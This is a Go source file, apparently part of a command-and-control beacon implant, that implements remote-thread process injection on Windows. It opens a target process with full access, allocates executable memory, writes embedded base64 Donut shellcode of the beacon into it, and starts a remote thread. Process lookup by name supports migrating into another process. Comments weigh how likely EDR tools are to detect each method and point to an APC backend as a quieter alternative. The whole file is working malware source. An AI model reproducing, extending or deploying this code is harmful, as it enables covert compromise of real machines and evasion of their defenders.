//go:build windows

package core

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

var (
	kernel32                     = syscall.NewLazyDLL("kernel32.dll")
	procOpenProcess              = kernel32.NewProc("OpenProcess")
	procVirtualAllocEx           = kernel32.NewProc("VirtualAllocEx")
	procVirtualFreeEx            = kernel32.NewProc("VirtualFreeEx")
	procWriteProcessMemory       = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread       = kernel32.NewProc("CreateRemoteThread")
	procWaitForSingleObject      = kernel32.NewProc("WaitForSingleObject")
	procGetExitCodeThread        = kernel32.NewProc("GetExitCodeThread")
	procCloseHandle              = kernel32.NewProc("CloseHandle")
	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First           = kernel32.NewProc("Process32FirstW")
	procProcess32Next            = kernel32.NewProc("Process32NextW")
)

const (
	processAllAccess       = 0x1F0FFF
	memCommit              = 0x1000
	memReserve             = 0x2000
	memRelease             = 0x8000
	pageExecuteReadWrite   = 0x40
	waitTimeout            = 0x00000102
	infinite               = 0xFFFFFFFF
	th32csSnapProcess      = 0x00000002
	maxPath                = 260
)

type processEntry32W struct {
	Size              uint32
	CntUsage          uint32
	ProcessID         uint32
	DefaultHeapID     uintptr
	ModuleID          uint32
	CntThreads        uint32
	ParentProcessID   uint32
	PriClassBase      int32
	Flags             uint32
	ExeFile           [maxPath]uint16
}

// injectInto dispatches to the injection backend named by
// method. The default is injectCreateRemoteThread, matching the
// historical behavior. "apc" selects remote APC injection; see
// inject_windows_threadless.go for the implementation.
func injectInto(ctx context.Context, pid int, method string) (uint32, error) {
	switch method {
	case "", "default":
		return injectCreateRemoteThread(ctx, pid)
	case "apc":
		return injectAPC(ctx, pid)
	default:
		// parseMigrateMethod refuses anything else before the
		// call, but this branch is retained so a hand-built
		// task cannot reach an unimplemented backend.
		return 0, fmt.Errorf(
			"inject: unknown method %q", method)
	}
}

// injectCreateRemoteThread performs classic remote-thread
// injection of the embedded shellcode into the target PID.
//
//   1. OpenProcess with PROCESS_ALL_ACCESS
//   2. VirtualAllocEx RWX in the target
//   3. WriteProcessMemory the shellcode
//   4. CreateRemoteThread pointing at the mapped shellcode
//   5. WaitForSingleObject with a 10s timeout
//   6. Read the thread's exit code, free the allocation, close
//      handles, return
//
// The shellcode is the Donut-wrapped form of the beacon binary
// itself. It runs the Go runtime inside the remote thread, and
// the loaded agent begins checking in on the same schedule the
// parent did.
//
// CreateRemoteThread from a non-allowlisted parent is a
// high-signal event on any host with EDR. The "apc" method is
// the lower-signal alternative; see inject_windows_threadless.go.
func injectCreateRemoteThread(ctx context.Context, pid int) (uint32, error) {
	shellcode, err := decodeInjectorShellcode()
	if err != nil {
		return 0, err
	}
	if len(shellcode) == 0 {
		return 0, errors.New("injector shellcode is empty")
	}

	hProcess, _, callErr := procOpenProcess.Call(
		uintptr(processAllAccess),
		0,
		uintptr(pid))
	if hProcess == 0 {
		return 0, fmt.Errorf(
			"OpenProcess(%d): %v (target may be protected, "+
				"or the beacon may lack SeDebugPrivilege)",
			pid, callErr)
	}
	defer procCloseHandle.Call(hProcess)

	addr, _, allocErr := procVirtualAllocEx.Call(
		hProcess,
		0,
		uintptr(len(shellcode)),
		uintptr(memCommit|memReserve),
		uintptr(pageExecuteReadWrite))
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAllocEx: %v", allocErr)
	}
	defer procVirtualFreeEx.Call(hProcess, addr, 0, memRelease)

	var written uintptr
	ok, _, writeErr := procWriteProcessMemory.Call(
		hProcess,
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)))
	if ok == 0 {
		return 0, fmt.Errorf("WriteProcessMemory: %v", writeErr)
	}
	if int(written) != len(shellcode) {
		return 0, fmt.Errorf(
			"WriteProcessMemory: short write %d/%d",
			written, len(shellcode))
	}

	hThread, _, threadErr := procCreateRemoteThread.Call(
		hProcess,
		0,
		0,
		addr,
		0,
		0,
		0)
	if hThread == 0 {
		return 0, fmt.Errorf("CreateRemoteThread: %v", threadErr)
	}
	defer procCloseHandle.Call(hThread)

	waitRes, _, _ := procWaitForSingleObject.Call(hThread, 10000)
	if waitRes == waitTimeout {
		diag("[beacon] inject pid %d: bootstrap thread still "+
			"running after 10s; assuming beacon is live\n", pid)
	}

	var exitCode uint32
	var gotCode uintptr
	procGetExitCodeThread.Call(
		hThread,
		uintptr(unsafe.Pointer(&exitCode)),
		uintptr(unsafe.Pointer(&gotCode)))

	_ = ctx
	return exitCode, nil
}

func findProcessByName(name string) (int, error) {
	name = filepath.Base(name)
	name = strings.ToLower(name)

	snap, _, snapErr := procCreateToolhelp32Snapshot.Call(
		uintptr(th32csSnapProcess), 0)
	if snap == 0 || snap == uintptr(syscall.InvalidHandle) {
		return 0, fmt.Errorf(
			"CreateToolhelp32Snapshot: %v", snapErr)
	}
	defer procCloseHandle.Call(snap)

	var entry processEntry32W
	entry.Size = uint32(unsafe.Sizeof(entry))

	ok, _, _ := procProcess32First.Call(
		snap,
		uintptr(unsafe.Pointer(&entry)))
	if ok == 0 {
		return 0, errors.New(
			"Process32First: no processes enumerated")
	}

	for {
		exe := syscall.UTF16ToString(entry.ExeFile[:])
		if strings.ToLower(exe) == name {
			return int(entry.ProcessID), nil
		}
		if len(exe) > 0 && !strings.HasSuffix(name, ".exe") {
			if strings.ToLower(exe) == name+".exe" {
				return int(entry.ProcessID), nil
			}
		}
		ok, _, _ = procProcess32Next.Call(
			snap,
			uintptr(unsafe.Pointer(&entry)))
		if ok == 0 {
			break
		}
	}
	return 0, fmt.Errorf(
		"migrate: no running process named %q", name)
}

func decodeInjectorShellcode() ([]byte, error) {
	if InjectorShellcodeB64 == "" {
		return nil, nil
	}
	return base64.StdEncoding.DecodeString(InjectorShellcodeB64)
}

var _ = os.Getpid